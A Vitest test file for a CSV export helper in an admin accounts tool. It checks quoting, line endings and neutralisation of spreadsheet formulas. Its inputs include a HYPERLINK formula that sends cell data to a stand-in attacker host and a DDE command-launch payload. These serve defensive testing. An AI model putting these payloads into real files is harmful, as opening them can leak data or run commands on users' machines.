import { describe, it, expect } from "vitest";
import { csvCell, accountsCsv } from "./accountsCsv";
import type { AdminAccount } from "../data/store";

describe("csvCell", () => {
  it("quotes values and doubles inner quotes", () => {
    expect(csvCell("Ada Lovelace")).toBe('"Ada Lovelace"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("a,b\nc")).toBe('"a,b\nc"');
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it("neutralises anything a spreadsheet would run as a formula", () => {
    expect(csvCell('=HYPERLINK("https://evil.example/?d="&B2,"Click")')).toBe('"\'=HYPERLINK(""https://evil.example/?d=""&B2,""Click"")"');
    expect(csvCell("+1+1")).toBe(`"'+1+1"`);
    expect(csvCell("-2+3")).toBe(`"'-2+3"`);
    expect(csvCell("@SUM(A1:A9)")).toBe(`"'@SUM(A1:A9)"`);
    expect(csvCell("\t=1+1")).toBe(`"'\t=1+1"`);
    expect(csvCell("\r=1+1")).toBe(`"'\r=1+1"`);
  });

  it("leaves ordinary values alone", () => {
    expect(csvCell("ada@example.com")).toBe('"ada@example.com"');
    expect(csvCell("Mary-Jane O'Neil")).toBe(`"Mary-Jane O'Neil"`);
    expect(csvCell("2026-09-30T10:00:00Z")).toBe('"2026-09-30T10:00:00Z"');
  });
});

describe("accountsCsv", () => {
  const rows: AdminAccount[] = [
    { id: "1", name: "=cmd|'/C calc'!A0", email: "x@evil.example", createdAt: "2026-09-01", updatedAt: "2026-09-29", approved: false, isAdmin: false, suspended: true },
    { id: "2", name: "José Álvarez", email: "jose@acme.co.uk", createdAt: "2026-09-02", updatedAt: "2026-09-30", isAdmin: true },
  ];

  it("writes a BOM, a header and one CRLF-terminated line per account", () => {
    const csv = accountsCsv(rows);
    expect(csv.startsWith("﻿")).toBe(true);
    const lines = csv.slice(1).split("\r\n");
    expect(lines).toHaveLength(4); // header + 2 rows + trailing empty
    expect(lines[0]).toBe('"Name","Email","Joined","Last active","Approved","Admin","Suspended"');
    expect(lines[1]).toBe(`"'=cmd|'/C calc'!A0","x@evil.example","2026-09-01","2026-09-29","no","no","yes"`);
    expect(lines[2]).toBe('"José Álvarez","jose@acme.co.uk","2026-09-02","2026-09-30","yes","yes","no"');
    expect(lines[3]).toBe("");
  });
});
